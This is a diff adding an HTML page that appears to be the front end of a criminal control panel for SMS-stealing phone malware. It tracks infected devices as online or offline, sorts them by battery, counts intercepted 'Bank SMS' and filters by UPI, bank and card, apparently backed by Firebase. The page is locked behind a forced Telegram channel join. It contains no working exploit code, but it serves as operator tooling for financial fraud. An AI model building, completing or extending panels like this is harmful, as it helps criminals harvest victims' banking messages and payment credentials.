@@ -1,0 +1,92 @@
+<!DOCTYPE html><html lang="en">
+<body style="background: #040912; color: white; font-family: Inter, sans-serif;">
+    <div id="universe-bg">
+        <!-- Background blobs and stars (Visuals only) -->
+        <span class="u-blob"></span><span class="u-blob"></span><span class="u-blob"></span><span class="u-fog"></span>
+        <!-- Stars would be here -->
+    </div>
+    
+    <div id="root">
+        <div class="min-h-screen text-white flex flex-col" style="background: rgba(4, 9, 18, 0.55);">
+            <div class="border-b border-[#1a2530]" style="background: rgba(6, 12, 20, 0.5);">
+                <div class="max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-6 flex-wrap">
+                    <div class="flex items-center gap-5">
+                        <div><p class="text-[9px] uppercase tracking-widest text-[#444] font-semibold">Total</p><p class="text-lg font-black text-white">0</p></div>
+                        <div><p class="text-[9px] uppercase tracking-widest text-[#444] font-semibold">Online</p><p class="text-lg font-black text-emerald-400">0</p></div>
+                        <div><p class="text-[9px] uppercase tracking-widest text-[#444] font-semibold">Offline</p><p class="text-lg font-black text-[#555]">0</p></div>
+                        <div><p class="text-[9px] uppercase tracking-widest text-[#444] font-semibold">Bank SMS</p><p class="text-lg font-black text-emerald-400">0</p></div>
+                    </div>
+                    <div class="ml-auto flex items-center gap-2 flex-wrap">
+                        <button class="px-3 py-1.5 rounded-lg text-xs font-semibold bg-red-600/20 text-red-400 border border-red-600/30">all</button>
+                        <button class="px-3 py-1.5 rounded-lg text-xs font-semibold text-[#555]">online</button>
+                        <button class="px-3 py-1.5 rounded-lg text-xs font-semibold text-[#555]">offline</button>
+                        <button class="px-3 py-1.5 rounded-lg text-xs font-semibold text-[#555]">saved</button>
+                        <button class="px-3 py-1.5 rounded-lg text-xs font-semibold text-[#555]">upi</button>
+                        <button class="px-3 py-1.5 rounded-lg text-xs font-semibold text-[#555]">bank</button>
+                        <button class="px-3 py-1.5 rounded-lg text-xs font-semibold text-[#555]">card</button>
+                        <div class="w-px h-4 bg-[#222]"></div>
+                        <button class="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold text-purple-400 bg-purple-600/20 border border-purple-600/30">SMS</button>
+                        <div class="w-px h-4 bg-[#222]"></div>
+                        <select class="bg-[#111] border border-[#222] text-xs text-[#666] rounded-lg px-2 py-1.5">
+                            <option value="new">Newest</option>
+                            <option value="old">Oldest</option>
+                            <option value="name">Name</option>
+                            <option value="battery">Battery</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+            <main class="flex-1 max-w-screen-2xl mx-auto w-full px-6 py-6">
+                <div>
+                    <div class="flex items-center gap-3 mb-5">
+                        <div class="w-4 h-4 border-2 border-[#333] border-t-red-500 rounded-full animate-spin"></div>
+                        <span class="text-sm text-[#555]">Connecting to Firebase…</span>
+                    </div>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4">
+                        <!-- Skeleton loaders (Pulse effect) -->
+                        <div class="bg-[#111111] border border-[#1f1f1f] rounded-2xl p-4 animate-pulse">
+                            <div class="flex items-start gap-3 mb-3">
+                                <div class="w-10 h-10 rounded-xl bg-[#1a1a1a]"></div>
+                                <div class="flex-1 space-y-2">
+                                    <div class="h-3 bg-[#1a1a1a] rounded w-3/4"></div>
+                                    <div class="h-2 bg-[#151515] rounded w-1/2"></div>
+                                </div>
+                            </div>
+                            <div class="grid grid-cols-2 gap-3 mb-3">
+                                <div class="h-8 bg-[#151515] rounded-xl"></div>
+                                <div class="h-8 bg-[#151515] rounded-xl"></div>
+                            </div>
+                            <div class="h-10 bg-[#131313] rounded-xl"></div>
+                        </div>
+                        <!-- More skeleton loaders would repeat here -->
+                    </div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <!-- Telegram Floating Action Button -->
+    <a href="https://t.me/legendpanel66" target="_blank" id="contact-fab" style="position:fixed;bottom:24px;right:24px;width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,#0ea5e9,#0369a1);display:flex;align-items:center;justify-content:center;z-index:99998;text-decoration:none;">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M21.5 2.5L2.5 10.3c-1.2.5-1.2 1.2-.2 1.5l4.9 1.5 1.9 5.8c.2.6.5.8 1 .8s.7-.2 1-.5l2.4-2.3 4.9 3.6c.9.6 1.6.3 1.8-.8l3.3-15.4c.3-1.3-.5-1.9-1.4-1.5z" fill="#ffffff"></path>
+        </svg>
+    </a>
+    
+    <!-- Telegram Join Gate (The blocking overlay) -->
+    <div id="tg-join-gate" style="position:fixed;inset:0;z-index:999999;display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(ellipse at 50% 0%, #0a1a2e 0%, #040912 55%, #020509 100%);">
+        <div style="max-width:360px;width:100%;background:rgba(255,255,255,0.08);backdrop-filter:blur(24px);border:1px solid rgba(255,255,255,0.25);border-radius:20px;padding:28px 24px;text-align:center;">
+            <div style="margin-bottom:12px;display:inline-block;">
+                <svg width="52" height="52" viewBox="0 0 240 240">
+                    <circle cx="120" cy="120" r="120" fill="#29a9eb"></circle>
+                    <path fill="#fff" d="M181.5 72.3c1.6-.7 3.5-.5 5 .5s2.2 2.7 2 4.4l-16.5 116c-.3 2.4-2.1 4.3-4.4 4.7-2.3.4-4.6-.8-5.6-2.9l-25.6-52.3-33.6 30.9c-1.1 1-2.6 1.5-4.1 1.3l3.1-27.6 51.1-46c1.6-1.4-.2-2.1-2.3-.7L82.4 145.9l-27.3-8.6c-2.5-.8-4.2-3-4.3-5.6-.1-2.6 1.4-5 3.8-6L181.5 72.3z"></path>
+                </svg>
+            </div>
+            <h2 style="color:#fff;font-size:18px;margin:0 0 8px;">Join Our Telegram Channel</h2>
+            <p style="color:rgba(255,255,255,0.7);font-size:14px;margin:0 0 20px;">Please join our Telegram channel to continue using this site.</p>
+            <a href="https://t.me/legendpanel66" target="_blank" style="display:block;background:linear-gradient(135deg,#0ea5e9,#0369a1);color:#fff;text-decoration:none;padding:12px;border-radius:10px;font-weight:600;font-size:14px;margin-bottom:12px;">Join Our Channel</a>
+            <button disabled style="width:100%;background:rgba(255,255,255,0.1);color:rgba(255,255,255,0.4);border:1px solid rgba(255,255,255,0.2);padding:12px;border-radius:10px;font-weight:600;font-size:14px;cursor:not-allowed;">Continue to Website</button>
+        </div>
+    </div>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"9f0cb6c09a0044d6981ba2b8776adb52","spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
